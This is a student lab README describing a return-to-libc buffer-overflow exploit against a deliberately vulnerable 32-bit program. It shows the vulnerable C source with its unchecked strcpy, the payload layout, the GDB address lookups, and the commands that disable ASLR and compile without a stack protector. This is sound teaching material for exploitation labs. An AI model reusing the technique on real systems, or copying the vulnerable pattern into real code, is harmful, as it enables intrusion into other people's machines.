ðŸ”“ Lab2-Libc-Attack: A Return-to-Libc ExploitThis lab demonstrates a Return-to-libc exploitation technique on a 32-bit Linux system. The objective is to exploit a vulnerable program (retlib) that has a non-executable stack by reusing existing libc functions (system() and exit()) to execute /bin/sh, without injecting shellcode.OverviewThis project implements a classic stack-based buffer overflow to demonstrate a Return-to-libc (ret2libc) attack on a 32-bit Linux binary with a non-executable stack (NX bit).Key Objectives:Demonstrate a buffer overflow vulnerability.Bypass stack execution protections (NX) by reusing existing code from libc.Successfully spawn a /bin/sh shell by overwriting the return address to call system().Illustrate stack frame layout and function call conventions in 32-bit x86.Prerequisites32-bit Linux VM (lab environment)gcc with multilib support (if building 32-bit on a 64-bit host)Python 3GDB (with peda or similar is helpful)Example seed image references: https://seedsecuritylabs.org/lab_env.htmlRepository FilesFileDescriptionretlib.cThe vulnerable program with a stack-based buffer overflow.envaddr.cA helper utility to print the address of an environment variable.exploit.pyPython script to generate the badfile payload.badfileThe binary payload file generated by exploit.py.README.mdThis documentation.images/Screenshots of the exploitation process.Exploitation FlowThe attack bypasses the non-executable stack by overwriting the saved return address on the stack to point to the system() function in libc.Disable ASLRAddress Space Layout Randomization is disabled (echo 0 > /proc/sys/kernel/randomize_va_space) so that libc function addresses are stable across runs.Find Target AddressesThe MYSHELL environment variable is set: export MYSHELL=/bin/sh.The envaddr helper (or GDB) is used to find the runtime address of the "/bin/sh" string in the target process's memory.GDB is used on the retlib binary to find the runtime addresses for system() and exit() within the loaded libc.Construct PayloadThe exploit.py script builds a badfile with a specific payload structure designed to overflow the buffer in bof() and overwrite the stack frame.Payload Layout:[ A * (Offset to EBP) ] + [ Saved EBP ] + [ system_addr ] + [ exit_addr ] + [ sh_addr ]
The payload fills the buffer, restores the saved EBP (to prevent stack corruption), and hijacks the return address.Execute ExploitThe vulnerable retlib program reads badfile into its stack buffer, triggering the overflow.When bof() returns, control flow is redirected to system().system() executes using the argument on the stack (sh_addr), spawning a shell.When the shell exits, control flows to exit(), ensuring a clean program termination.How to Compile and Run1. Disable ASLR (as root)Bash# Disable ASLR for predictable addresses
echo 0 > /proc/sys/kernel/randomize_va_space
2. Compile (32-bit)Bash# Compile the vulnerable program with no stack protector and a non-executable stack
gcc -m32 -o retlib retlib.c -fno-stack-protector -z noexecstack

# Compile the helper
gcc -m32 -o envaddr envaddr.c
3. Get AddressesBash# Set environment variable
export MYSHELL=/bin/sh

# Get address of the string
./envaddr
# Address: bfffff01 (example)

# Get libc function addresses in GDB
gdb -q ./retlib
(gdb) p (void*) system
# $1 = (void *) 0xb7da4da0 <__libc_system> (example)
(gdb) p (void*) exit
# $2 = (void *) 0xb7d989d0 <__GI_exit> (example)
4. Build and Run ExploitUpdate exploit.py with the addresses found in Step 3.Bash# Generate the payload
python3 exploit.py

# Run the exploit
./retlib
# ... program output ...
whoami
# seed
Step-by-Step Demonstration1. Getting Target AddressesUsing envaddr to find the /bin/sh string and GDB to find system() and exit().2. Payload GenerationThe exploit.py script generates badfile. The hexdump shows the addresses for system, exit, and /bin/sh in little-endian format.3. Successful ExploitRunning ./retlib consumes the badfile, overflows the buffer, and successfully spawns an interactive shell, confirmed with whoami.Vulnerable Code (retlib.c)C#include <stdlib.h>
#include <stdio.h>
#include <string.h>

int bof(char *str) {
    char buffer[270];
    unsigned int *framep;

    // Copy ebp into framep
    asm("movl %%ebp, %0" : "=r" (framep));

    /* print out information for experiment purpose */
    printf("Address of buffer[] inside bof(): 0x%.8x\n", (unsigned)buffer);
    printf("Frame Pointer value inside bof(): 0x%.8x\n", (unsigned)framep);

    strcpy(buffer, str); // <-- VULNERABILITY
    return 1;
}

int main(int argc, char **argv) {
    char input[1000];
    FILE *badfile;

    badfile = fopen("badfile", "r");
    int length = fread(input, sizeof(char), 1000, badfile);

    printf("Address of input[] inside main(): 0x%x\n", (unsigned int) input);
    printf("Input size: %d\n", length);

    bof(input);

    printf("(^_^)(^_^) Returned Properly (^_^)(^_^)\n");
    return 1;
}
Summary of Results1Task: Use Return-to-libc technique to execute /bin/sh in a vulnerable 32-bit pro2gram with a non-executable stack.Result: Successful â€” system("/bin/sh") was called and an interactive shell was obtained (whoami returned seed).Key lessons:Use the process-specific /bin/sh address, as environment layout differs between processes.Restore the saved EBP if overwriting it to prevent stack corruption by the leave instruction.Keep ASLR disabled for predictable addresses in a controlled lab environment.AuthorPrepared by: Abdulrahman ALQunaibitLab date: October 2, 2025
